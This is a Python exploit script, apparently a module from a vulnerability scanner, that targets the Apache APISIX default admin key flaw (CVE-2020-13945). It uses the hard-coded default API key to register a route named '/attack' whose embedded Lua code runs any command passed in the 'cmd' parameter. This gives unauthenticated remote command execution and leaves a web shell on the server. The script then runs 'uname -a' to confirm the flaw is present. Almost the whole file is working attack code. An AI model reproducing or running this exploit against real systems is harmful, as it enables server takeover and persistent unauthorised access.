import requests
import time
from bs4 import BeautifulSoup
import json
import logging

ar='uname -a'
jh=''
http = ''
https = ''
def dl15(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global jh
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
        'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
        }
        data={"uri": "/attack","script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M","upstream": {"type": "roundrobin","nodes": {"example.com:80": 1}}}
        logging.captureWarnings(True)
        aa = requests.post(url1+'apisix/admin/routes',cookies=s_cookie,headers=headers,proxies=proxies,verify=False,json=data)
        if aa.status_code==201:
            aaaa = requests.get(url1+'attack?cmd=%s'%(ar))
            aaaa.encoding='utf-8'
            if 'Linux' in aaaa.text:
                jh='[+]漏洞存在'
            else:
                jh='[-]漏洞不存在'
        else:
            jh='[-]漏洞不存在'+str(aa.status_code)
    except Exception as aaa:
        jh='[-]链接错误\n'+str(aaa)
def jg1():
    global jh
    return '--------------------------------------------------\n[ Apache APISIX 默认密钥漏洞（CVE-2020-13945） ]\n\n'+str(jh)+'\n'
def u1(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)


